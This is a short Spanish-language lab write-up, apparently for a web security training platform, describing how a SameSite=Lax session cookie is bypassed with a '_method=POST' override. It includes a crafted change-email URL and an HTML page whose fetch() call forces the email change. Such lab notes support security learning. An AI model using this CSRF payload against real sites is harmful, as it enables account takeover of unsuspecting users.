---
title: "07 - SameSite Lax bypass via method override"
---

# 07 - SameSite Lax bypass via method override

La cookie de sesión tiene Samesite=Lax por defecto, por lo que no puede ser enviada al hacer una solicitud desde nuestro dominio de ataque al otro dominio, por lo que no se incluirá en el POST al hacer la petición al cambio de correo.

Con lax solo se pueden enviar por GET, en este caso no se puede transformar la solicitud POST, pero si nos ha dejado hacer esto:

```
https://0a8c00d704be405382cd109300d200d3.web-security-academy.net/my-account/change-email?email=test111%40test.com&_method=POST
```

```html
<html>
    <script>
			fetch('https://0a8c00d704be405382cd109300d200d3.web-security-academy.net/my-account/change-email?email=test111%40test.com&_method=POST');
    </script>
</html>
```
